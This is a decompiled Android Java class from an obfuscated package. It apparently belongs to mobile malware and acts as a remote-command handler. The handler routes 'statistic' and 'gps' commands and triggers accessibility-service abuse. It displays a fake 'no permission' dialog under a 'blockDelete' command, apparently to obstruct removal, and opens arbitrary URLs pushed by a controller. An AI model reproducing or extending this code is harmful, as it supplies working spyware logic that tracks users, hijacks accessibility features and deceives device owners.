package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.R;

public class dzudmx extends Activity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        String str;
        super.onCreate(bundle);
        C0034b bVar = new C0034b();
        String stringExtra = getIntent().getStringExtra("start");
        if (stringExtra.contains("statistic")) {
            str = "statistic";
        } else if (stringExtra.contains("gps")) {
            str = "gps";
        } else if (stringExtra.contains("deleteApp")) {
            StringBuilder sb = new StringBuilder();
            sb.append("package:");
            sb.append(getPackageName());
            startActivity(new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse(sb.toString())));
            return;
        } else if (stringExtra.contains("accessibility")) {
            try {
                bVar.mo232d(this, "accessibility");
                return;
            } catch (Exception unused) {
            }
        } else if (stringExtra.contains("blockDelete")) {
            Builder builder = new Builder(this);
            builder.setTitle("Sorry!").setMessage("You have no permission to use this app!").setIcon(R.drawable.im).setCancelable(false).setNegativeButton("ОК", new OnClickListener() {
                public void onClick(DialogInterface dialogInterface, int i) {
                    dzudmx.this.finish();
                }
            });
            builder.create().show();
            return;
        } else {
            if (stringExtra.contains("**startbrurl**")) {
                startActivity(new Intent("android.intent.action.VIEW", Uri.parse(stringExtra.replace("**startbrurl**", ""))));
            }
            return;
        }
        bVar.mo232d(this, str);
    }
}
